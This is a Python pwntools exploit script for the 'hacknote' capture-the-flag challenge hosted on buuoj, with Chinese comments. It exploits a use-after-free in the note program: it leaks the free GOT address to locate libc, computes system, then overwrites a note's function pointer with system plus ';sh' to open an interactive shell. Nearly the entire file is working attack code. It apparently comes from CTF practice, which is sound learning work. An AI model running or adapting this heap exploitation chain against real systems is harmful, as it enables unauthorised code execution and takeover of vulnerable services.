from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'hacknote'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='i386', log_level='debug', endian='little')

'''
UAF
'''
def add_note(size:int, content:bytes=b'\x00'):
    global io
    io.sendlineafter(b"Your choice :", b'1')
    io.sendlineafter(b"Note size :", str(size).encode())
    io.sendafter(b"Content :", content)
    io.recvuntil(b"Success !\n")

def delete_note(idx:int):
    global io
    io.sendlineafter(b"Your choice :", b'2')
    io.sendlineafter(b"Index :", str(idx).encode())
    io.recvuntil(b"Success\n")

def print_note(idx:int):
    global io
    io.sendlineafter(b"Your choice :", b'3')
    io.sendlineafter(b"Index :", str(idx).encode())
    return io.recvuntil(b"----------------------\n")


puts_addr = 0x804862b

add_note(0x30)
add_note(0x30, b'/bin/sh\x00')

delete_note(0)
delete_note(1)

add_note(0x8, p32(puts_addr) + p32(io_elf.got['free']))

msg = print_note(0)
print(msg)
free_addr = msg[:4]
free_addr = u32(free_addr)
LOG_ADDR_SUCCESS('free_addr', free_addr)

libc = LibcSearcher('free', free_addr)
lib_base_addr = free_addr - libc.dump('free')
system_addr = lib_base_addr + libc.dump('system')
str_bin_sh = lib_base_addr + libc.dump('str_bin_sh')
LOG_ADDR_SUCCESS('lib_base_addr', lib_base_addr)
LOG_ADDR_SUCCESS('system_addr', system_addr)
LOG_ADDR_SUCCESS('str_bin_sh', str_bin_sh)

delete_note(2)
gdaget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066]
one_gadget = lib_base_addr + gdaget[5]
add_note(0x8, p32(system_addr) + b';sh\x00')
STOP()
io.sendlineafter(b"Your choice :", b'3')
io.sendlineafter(b"Index :", str(0).encode())
# sleep(0.2)
# io.sendline(b'cat flag')


io.interactive()
